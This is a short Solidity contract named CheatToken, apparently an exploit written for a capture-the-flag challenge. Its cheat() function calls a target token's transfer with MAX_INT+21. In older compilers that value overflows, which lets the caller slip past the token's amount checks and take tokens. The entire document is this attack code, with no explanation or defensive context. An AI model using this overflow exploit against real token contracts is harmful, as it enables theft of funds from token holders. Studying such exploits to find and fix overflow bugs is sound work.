contract CheatToken {
    uint256 MAX_INT = 2**256 - 1;
    Token contractToken;
    constructor(address _adr)public {
        contractToken = Token(_adr);
    }
    function cheat() public{
        contractToken.transfer(msg.sender,MAX_INT+21);
    }
}
